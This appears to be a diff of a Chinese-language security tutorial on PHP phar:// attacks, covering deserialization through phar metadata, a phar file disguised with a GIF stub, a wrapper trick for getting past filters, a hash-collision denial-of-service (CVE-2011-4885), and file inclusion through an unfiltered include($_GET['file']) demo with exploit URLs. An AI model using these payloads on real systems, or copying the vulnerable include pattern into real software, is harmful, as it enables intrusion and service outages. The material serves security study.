@@ -1,16 +1,22 @@
+# Phar的文件包含与反序列化
+
 ## 反序列化
-参考
+
+**参考**
+
 - https://blog.zsxsoft.com/post/38
 - https://paper.seebug.org/680/
 
-利用条件
+**利用条件**
+
 - phar文件要能够上传到服务器端。
 - 存在`__destruct`,`__wakeup`魔术方法作为跳板
 - 存在相关[函数](https://blog.zsxsoft.com/post/38)函数,并且参数可控，`:`、`/`、`phar`等特殊字符没有被过滤。
 
-受影响的函数列表
+**受影响的函数列表**
 ![](/images/19-1-19_2018总结-PHP篇_利用类进行反序列化Phar1.png)
-对于函数影响范围的深入追求参看`zsx`师傅的文章，简单如下：
+对于函数影响范围的深入追求参看[zsx](https://blog.zsxsoft.com/post/38)师傅的文章，简单如下：
+
 - exif (exif_thumbnail、exif_imagetype)
 - gd (imageloadfont、imagecreatefrom..)
 - hash (hash_hmac_file、hash_file、hash_update_file、md5_file、sha1_file)
@@ -43,8 +49,18 @@ $s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);
 $p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;');
 ```
 
-构造恶意phar包的php文件：
-phar.php
+**phar://绕过**
+如果waf过滤了phar://，则可以使用：
+
+```
+compress.bzip2://phar://
+compress.zlib://
+```
+
+### 利用
+
+**构造恶意phar包的php文件：**
+
 ```php
 <?php
     class TestObject {
@@ -62,13 +78,16 @@ phar.php
 ?>
 ```
 
-其中`xxx<?php xxx; __HALT_COMPILER();?>`时phar文件的stub，可用理解为一个表示，必须以`__HALT_COMPILER();?>`结尾，否则phar扩展将无法识别这个文件为phar文件。具体参考`seebug`的文章。
+其中`xxx<?php xxx; __HALT_COMPILER();?>`是phar文件的stub，可用理解为一个身份id。其中stub的内容必须以`__HALT_COMPILER();?>`结尾，否则phar扩展将无法识别这个文件为phar文件。具体参考[seebug](https://paper.seebug.org/680/)的文章。
 
-攻击测试
-parh_test1.php
+**phar反序列化已构造的恶意php文件**
+
 ```php
 <?php 
     class TestObject {
+    	public function __wakeup() {
+            echo 'Destruct wakeup';
+        }
         public function __destruct() {
             echo 'Destruct called';
         }
@@ -79,8 +98,10 @@ parh_test1.php
 ?>
 ```
 
-phar文件可伪造为其他文件
-phar_2.php
+![](/images/19-7-13_Phar的文件包含与反序列化_反序列化_1.png)
+
+**phar文件可通过添加幻术伪造为其他类型的文件：**
+
 ```php
 <?php
     class TestObject {
@@ -98,8 +119,12 @@ phar_2.php
 ?>
 ```
 
+![](/images/19-7-23_PHP_Phar的文件包含与反序列化_反序列化_2.png)
+
+## 拒绝服务
+
 **还可以利用来进行拒绝服务攻击(PHP内核哈希表碰撞攻击（CVE-2011-4885）)**
-exp_phar.php
+
 ```php
 <?php
 set_time_limit(0);
@@ -115,7 +140,8 @@ $p['hacker.php'] = '<?php ?>';
 $p->setMetadata($new_obj);
 $p->setStub('GIF<?php __HALT_COMPILER();?>');
 ```
-test.php
+**反序列化恶意文件**
+
 ```php
 <?php
 set_time_limit(0);
@@ -125,20 +151,23 @@ $endTime = microtime(true);
 echo '执行时间：  '.($endTime - $startTime). ' 秒'; 
 ```
 
-**phar://绕过**
-可以使用：
-```
-compress.bzip2://phar://
-compress.zlib://
-```
-## 文件包含
-(PHP 5 >= 5.3.0, PHP 7, PECL phar >= 1.0.0)
+![](/images/19-7-23_PHP_Phar的文件包含与反序列化_反序列化_3.png)
 
-参考：
+## 文件包含
+
+**利用范围**
+
+- PHP 5 >= 5.3.0、 PECL phar >= 1.0.0
+- PHP 7、 PECL phar >= 1.0.0
+
+**参考：**
+
 - https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/
 
-demo.php
+**测试代码**
+
 index.php
+
 ```php
 <?php
 include($_GET['file']);
@@ -155,3 +184,6 @@ shell.txt
 index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/shell.txt   //绝对路径
 index.php?file=phar://test.zip/shell.txt   //相对路径
 ```
+
+![](/images/19-7-23_PHP_Phar的文件包含与反序列化_文件包含_1.png)
+
